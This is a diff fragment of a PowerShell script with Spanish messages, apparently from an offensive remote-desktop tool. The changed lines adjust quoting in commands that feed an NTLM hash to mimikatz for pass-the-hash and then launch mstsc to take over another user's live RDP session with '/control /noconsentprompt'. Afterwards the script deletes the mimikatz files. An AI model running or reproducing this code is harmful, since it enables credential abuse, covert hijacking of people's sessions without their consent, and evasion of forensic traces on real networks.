@@ -253,12 +253,12 @@ function EnableTLS {
     Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2000 
     if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
     
-    if($control -eq 'true') { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /control /noconsentprompt' /f"
+    if($control -eq 'true') { $mimipwn = "'mstsc` /v` $computer` $admin` /shadow:$shadow` /control` /noconsentprompt` /f'"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
     
-    else { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /noconsentprompt' /f"
+    else { $mimipwn = "'mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f'"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
